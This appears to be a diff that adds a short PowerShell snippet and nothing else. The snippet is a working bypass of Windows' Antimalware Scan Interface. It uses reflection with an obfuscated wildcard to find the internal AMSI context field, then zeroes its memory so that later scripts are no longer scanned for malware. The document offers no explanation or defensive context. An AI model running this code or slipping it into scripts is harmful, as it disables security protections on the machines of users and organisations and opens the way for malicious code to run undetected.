@@ -1,0 +1,4 @@
+# Works in both PowerShell and PowerShell Core
+$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ontext"}}}
+[IntPtr]$Ptr=$Var.GetValue($NULL); [Int32[]]$Buff=@(0)
+[System.Runtime.InteropServices.Marshal]::Copy($Buff, 0, $Ptr, 1)
